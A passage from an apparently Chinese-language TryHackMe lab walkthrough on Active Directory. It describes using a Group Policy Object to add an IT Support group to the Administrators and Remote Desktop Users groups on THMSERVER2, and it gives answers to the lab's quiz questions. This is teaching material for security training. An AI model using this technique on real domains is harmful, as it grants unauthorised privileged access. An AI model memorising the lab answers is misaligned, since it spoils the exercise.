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" width="355" height="451" class="img_ev3q"></p></div>
<p>第一个筛选器未被使用。对于第二个筛选器，我们想要添加管理员组和远程桌面用户组。最终，它应该类似于这样：</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC za.tryhackme.com domain IT Support Properties Groups" src="data:image/png;base64,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" width="354" height="449" class="img_ev3q"></p></div>
<p>配置完成后，我们可以点击应用并确定。现在，我们所需做的就是等待最多 15 分钟让 GPO 生效。之后，我们最初添加到 IT 支持组的账户将在 THMSERVER2 上拥有管理员和远程桌面权限！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>什么对象允许用户配置 Windows 策略？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Group Policy Objects</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪些 AD 功能允许我们为整个 AD 结构配置 GPO？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Group Policy Management</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 